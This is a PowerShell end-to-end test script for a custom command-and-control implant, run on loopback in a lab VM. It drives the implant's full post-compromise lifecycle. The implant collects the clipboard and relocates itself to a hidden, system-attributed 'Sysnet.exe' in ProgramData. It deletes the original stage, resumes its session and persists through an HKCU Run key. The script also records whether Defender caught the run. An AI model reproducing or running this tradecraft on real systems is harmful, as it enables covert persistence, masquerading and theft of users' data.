# opsflow-test.ps1 - T039/T040 end-to-end: the full post-implant
# operational lifecycle on loopback, run inside the lab VM.
#
# Stages: (1) teamserver loopback; (2) cfg rule with an onboarding
# playbook; (3) implant STAGED on the Desktop registers; (4) first poll
# delivers module survey + collect clipboard + relocate (respawn) in one
# burst; (5) the resident copy in ProgramData resumes the SAME session,
# deletes the stage; (6) a post-relocation task round-trips through the
# resident; (7) verification of every artifact (hidden file, run key,
# stage gone, audit events); (8) teardown.
#
# Usage: powershell -NoProfile -ExecutionPolicy Bypass -File lab\opsflow-test.ps1 -Work C:\abram-ops

param(
    [string]$Work = 'C:\abram-ops',
    [switch]$NoTeardown
)

$ErrorActionPreference = 'Stop'
function Section($t) { Write-Host "`n=== $t" -ForegroundColor Cyan }
function Ok($t) { Write-Host "  [ok] $t" -ForegroundColor Green }
function Bad($t) { Write-Host "  [FAIL] $t" -ForegroundColor Red; $script:failed = $true }
$script:failed = $false

# --- raw TCP mgmt client (same JSON-lines protocol as mgmt.py) ---
function Mgmt([object]$request, [int]$timeoutSec = 20) {
    $client = New-Object System.Net.Sockets.TcpClient('127.0.0.1', 9200)
    $stream = $client.GetStream()
    $stream.ReadTimeout = $timeoutSec * 1000
    $json = $request | ConvertTo-Json -Depth 8 -Compress
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json + "`n")
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Flush()
    $reader = New-Object System.IO.StreamReader($stream)
    # Accumulate until the line parses (the server writes the JSON and
    # the newline as separate writes; a single ReadLine can observe a
    # partial frame - same reason mgmt.py reads until a gap).
    $text = ''
    while ($true) {
        $line = $reader.ReadLine()
        if ($null -eq $line) { break }
        $text += $line
        try { $parsed = $text | ConvertFrom-Json; $client.Close(); return $parsed }
        catch { continue }
    }
    $client.Close()
    Write-Host "  [mgmt-raw] $text"
    throw "mgmt: unparseable response"
}

New-Item -ItemType Directory -Force -Path $Work | Out-Null
$server = $null
$stage = 'C:\Users\lab\Desktop\abraham-stage.exe'
$residentDir = 'C:\ProgramData\Sysnet'
$resident = Join-Path $residentDir 'Sysnet.exe'

try {
    Section '1. teamserver loopback'
    $server = Start-Process -FilePath (Join-Path $Work 'abraham-server.exe') `
        -ArgumentList "--listen 127.0.0.1:8443 --mgmt 127.0.0.1:9200 --state `"$Work\sessions.json`" --audit `"$Work\audit.jsonl`"" `
        -WorkingDirectory $Work -WindowStyle Hidden -PassThru `
        -RedirectStandardOutput "$Work\server.log" -RedirectStandardError "$Work\server.err.log"
    $pubFile = Join-Path $Work 'server.pub'
    $deadline = (Get-Date).AddSeconds(20)
    while (-not (Test-Path $pubFile) -and (Get-Date) -lt $deadline) { Start-Sleep -Milliseconds 250 }
    if (-not (Test-Path $pubFile)) { throw 'server did not come up' }
    $pub = (Get-Content $pubFile -Raw).Trim()
    Ok "server pid $($server.Id), pub $pub"

    Section '2. onboarding rule (T039 playbook with relocate step)'
    $rule = @{
        note = 'opsflow lab'
        match_user = 'lab'
        playbook = @('module whoami', 'collect clipboard',
                     'relocate C:\ProgramData\Sysnet Sysnet.exe run-key respawn')
    }
    $add = Mgmt @{ cmd = 'cfg'; action = 'add'; rule = $rule }
    if ($add.ok) { Ok "rule added, epoch $($add.epoch)" } else { Bad "cfg add: $($add | ConvertTo-Json -Compress)" }
    $cfgList = Mgmt @{ cmd = 'cfg'; action = 'list' }
    if ($cfgList.rules[0].playbook.Count -eq 3) { Ok 'playbook persisted with 3 steps' } else { Bad 'playbook not persisted' }

    Section '3. stage lands and registers'
    Copy-Item (Join-Path $Work 'abraham-implant.exe') $stage -Force
    $implantArgs = "--server 127.0.0.1:8443 --key $pub --sleep 2 --jitter 0.1"
    $stageProc = Start-Process -FilePath $stage -ArgumentList $implantArgs `
        -WorkingDirectory $Work -WindowStyle Hidden -PassThru
    Start-Sleep -Seconds 6
    $sessions = Mgmt @{ cmd = 'sessions' }
    $sess = $sessions.sessions | Where-Object { $_.id -ge 1 } | Select-Object -First 1
    if ($null -eq $sess) { Bad 'no session registered'; throw 'abort' }
    $sid = $sess.id
    Ok "session $sid (user $($sess.username), pending before first poll: $($sess.pending_tasks))"

    Section '4. playbook delivers on first polls'
    Start-Sleep -Seconds 8
    $results = Mgmt @{ cmd = 'results'; session = $sid; limit = 20 }
    $byId = @{}
    foreach ($r in $results.results) { $byId[$r.task_id] = $r }
    $who = $byId[1]
    if ($who -and $who.status -eq 0 -and $who.summary -match 'pid=') { Ok "module whoami: $($who.summary.Trim())" } else { Bad "module whoami result missing: $($who | ConvertTo-Json -Compress)" }
    $clip = $byId[2]
    if ($clip -and $clip.status -eq 0) { Ok "collect clipboard ok (status 0)" } else { Bad "collect clipboard result: $($clip | ConvertTo-Json -Compress)" }
    $rel = $byId[3]
    if ($rel -and $rel.status -eq 0 -and $rel.summary -match 'respawn') {
        Ok "relocate: $($rel.summary -replace "`n", ' | ')"
    } else { Bad "relocate result: $($rel | ConvertTo-Json -Compress)" }

    Section '5. resident copy lives, stage is gone'
    Start-Sleep -Seconds 6
    if (-not (Test-Path $resident)) { Bad "resident $resident missing" } else {
        Ok 'resident binary present'
        $attr = (Get-Item $resident -Force).Attributes
        if ($attr -band [IO.FileAttributes]::Hidden -and $attr -band [IO.FileAttributes]::System) { Ok "resident hidden+system ($attr)" } else { Bad "resident attributes: $attr" }
    }
    if (Test-Path $stage) { Bad 'stage binary still on Desktop' } else { Ok 'stage binary deleted by resident' }

    Section '5b. Defender behavioral check (evidence, not a pass/fail)'
    try {
        $t0d = (Get-Date).AddMinutes(-10)
        $dets = @(Get-MpThreatDetection -ErrorAction Stop | Where-Object { $_.DetectionTime -ge $t0d -and ($_.Resources -join ';') -match 'Sysnet' })
        if ($dets.Count -gt 0) { Write-Host "  [note] Defender detections this run window: $($dets.Count) (expected 0 with the lab exclusion; the unexcluded first run WAS caught - file+process+runkey)" }
        else { Ok 'no new Defender detections (lab exclusion active)' }
    } catch { Write-Host "  [note] Defender query failed: $($_.Exception.Message)" }

    Section '6. session continuity (resume, not sibling)'
    $sessions = Mgmt @{ cmd = 'sessions' }
    $after = $sessions.sessions | Where-Object { $_.id -eq $sid }
    if ($null -eq $after) { Bad 'session died after relocation' }
    else {
        $stillOne = ($sessions.sessions | Measure-Object).Count
        if ($stillOne -eq 1) { Ok "session $sid still the ONLY session (age $($after.age)s)" } else { Bad "$stillOne sessions after relocation (expected 1)" }
    }

    Section '7. task through the resident copy'
    $q = Mgmt @{ cmd = 'module'; session = $sid; name = 'whoami' }
    Start-Sleep -Seconds 5
    $results = Mgmt @{ cmd = 'results'; session = $sid; limit = 20 }
    $whoami = @($results.results | Where-Object { $_.summary -match 'pid=' })
    if ($whoami.Count -ge 2) { Ok "post-relocation whoami round-tripped ($($whoami.Count) whoami results, latest task_id $($whoami[0].task_id))" } else { Bad "expected 2 whoami results, have $($whoami.Count)" }

    Section '8. persistence armed against the resident'
    $rk = Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Sysnet' -ErrorAction SilentlyContinue
    if ($rk -and $rk.Sysnet -eq "`"$resident`"") { Ok "HKCU Run\Sysnet -> $resident" } else { Bad "run key wrong: $($rk.Sysnet)" }
    $residentProc = Get-Process | Where-Object { $_.Path -eq $resident }
    if ($residentProc) { Ok "resident running as pid $($residentProc.Id)" } else { Bad 'resident process not running' }

    Section '9. audit trail'
    $audit = Get-Content "$Work\audit.jsonl" | ForEach-Object { $_ | ConvertFrom-Json }
    $events = ($audit | ForEach-Object { $_.event } | Group-Object | ForEach-Object { "$($_.Name)x$($_.Count)" }) -join ' '
    Ok $events
    if ($audit | Where-Object { $_.event -eq 'playbook_queued' }) { Ok 'playbook_queued audited' } else { Bad 'playbook_queued missing from audit' }
    if ($audit | Where-Object { $_.event -eq 'session_resume' }) { Ok 'session_resume audited (token hand-off worked)' } else { Bad 'session_resume missing - resident did NOT resume' }

    Section '10. teardown'
    if (-not $NoTeardown) {
        Mgmt @{ cmd = 'persist'; session = $sid; action = 'remove'; mechanism = 'run-key'; name = 'Sysnet' } | Out-Null
        Start-Sleep -Seconds 4
        Get-Process | Where-Object { $_.Path -eq $resident } | Stop-Process -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 1
        Remove-Item -Recurse -Force $residentDir -ErrorAction SilentlyContinue
        Remove-Item -Force $stage -ErrorAction SilentlyContinue
        $rkGone = -not (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Sysnet' -ErrorAction SilentlyContinue)
        if ($rkGone -and -not (Test-Path $resident)) { Ok 'run key removed, resident dir gone' } else { Bad 'teardown incomplete' }
    } else { Write-Host '  (skipped)' }
}
finally {
    if ($server -and -not $server.HasExited) { Stop-Process -Id $server.Id -Force -ErrorAction SilentlyContinue }
    Get-Process | Where-Object { $_.Path -eq $stage } | Stop-Process -Force -ErrorAction SilentlyContinue
}

Write-Host ''
if ($script:failed) { Write-Host 'OPSFLOW: FAILURES PRESENT' -ForegroundColor Red; exit 1 }
Write-Host 'OPSFLOW: ALL GREEN' -ForegroundColor Green
